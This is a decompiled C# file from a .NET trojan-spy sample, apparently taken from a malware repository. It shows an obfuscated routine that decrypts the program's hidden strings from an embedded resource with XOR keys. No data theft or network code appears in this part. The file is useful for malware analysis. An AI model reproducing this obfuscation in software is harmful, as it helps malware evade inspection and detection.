// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Stub, Version=2.1.1.1, Culture=neutral, PublicKeyToken=null
// MVID: EC6FBD32-3576-4D40-B4A5-7808EA9CDA7F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Spy.MSIL.Redator.a-0ffe71461f45eb03a9be8c4511c61dda546931a131248a9b132be930c160388f.exe

using \u0006;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace \u0006
{
  internal static class \u0001
  {
    private static readonly Dictionary<int, string> \u0001 = new Dictionary<int, string>(207);
    private static BinaryReader \u0001;
    private static byte[] \u0001;
    private static short \u0001;
    private static bool \u0001;
    private static byte[] \u0001;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static string \u0003([In] int obj0)
    {
      lock (\u0006.\u0001.\u0001)
      {
        string str;
        if (\u0006.\u0001.\u0001.TryGetValue(obj0, out str))
          return str;
        if (\u0006.\u0001.\u0001 == null)
          goto label_28;
label_7:
        int num1 = obj0 ^ -1567517749;
        \u0006.\u0001.\u0001.BaseStream.Position = (long) num1;
        byte[] numArray;
        if (\u0006.\u0001.\u0001 != null)
        {
          numArray = \u0006.\u0001.\u0001;
        }
        else
        {
          short count = \u0006.\u0001.\u0001 != (short) -1 ? \u0006.\u0001.\u0001 : (short) ((int) \u0006.\u0001.\u0001.ReadInt16() ^ 32401 ^ num1);
          numArray = count != (short) 0 ? \u0006.\u0001.\u0001.ReadBytes((int) count) : (byte[]) null;
        }
        int count1 = \u0006.\u0001.\u0001.ReadInt32() ^ num1 ^ -409120314;
        bool flag = (count1 & int.MinValue) != 0;
        if (flag)
          count1 &= int.MaxValue;
        byte[] bytes = \u0002.\u0003(numArray, \u0006.\u0001.\u0001.ReadBytes(count1));
        if (\u0006.\u0001.\u0001 != null != \u0006.\u0001.\u0001)
        {
          for (int index = 0; index < count1; ++index)
          {
            byte num2 = \u0006.\u0001.\u0001[index & 7];
            byte num3 = (byte) ((int) num2 << 3 | (int) num2 >> 5);
            bytes[index] = (byte) ((uint) bytes[index] ^ (uint) num3);
          }
        }
        if (flag && !\u0006.\u0001.\u0001)
        {
          char[] chArray = new char[count1];
          for (int index = 0; index < count1; ++index)
            chArray[index] = (char) bytes[index];
          str = new string(chArray);
        }
        else
          str = Encoding.Unicode.GetString(bytes, 0, bytes.Length);
        if (\u0006.\u0001.\u0001)
          str = (obj0 + count1 ^ 936568).ToString(\u0001.\u0001.\u0003(699));
        str = string.Intern(str);
        \u0006.\u0001.\u0001.Add(obj0, str);
        if (\u0006.\u0001.\u0001.Count == 207)
        {
          \u0006.\u0001.\u0001.Close();
          \u0006.\u0001.\u0001 = (BinaryReader) null;
          \u0006.\u0001.\u0001 = \u0006.\u0001.\u0001 = (byte[]) null;
        }
        return str;
label_28:
        Assembly executingAssembly = Assembly.GetExecutingAssembly();
        Assembly.GetCallingAssembly();
        \u0006.\u0001.\u0001 = false;
        \u0006.\u0001.\u0001 = new BinaryReader(executingAssembly.GetManifestResourceStream(\u0001.\u0001.\u0003(650)));
        short count2 = (short) ((int) \u0006.\u0001.\u0001.ReadInt16() ^ 13973);
        if (count2 == (short) 0)
          \u0006.\u0001.\u0001 = (short) ((int) \u0006.\u0001.\u0001.ReadInt16() ^ -31837);
        else
          \u0006.\u0001.\u0001 = \u0006.\u0001.\u0001.ReadBytes((int) count2);
        \u0006.\u0001.\u0001 = executingAssembly.GetName().GetPublicKeyToken();
        if (\u0006.\u0001.\u0001 != null && \u0006.\u0001.\u0001.Length == 0)
        {
          \u0006.\u0001.\u0001 = (byte[]) null;
          goto label_7;
        }
        else
          goto label_7;
      }
    }
  }
}
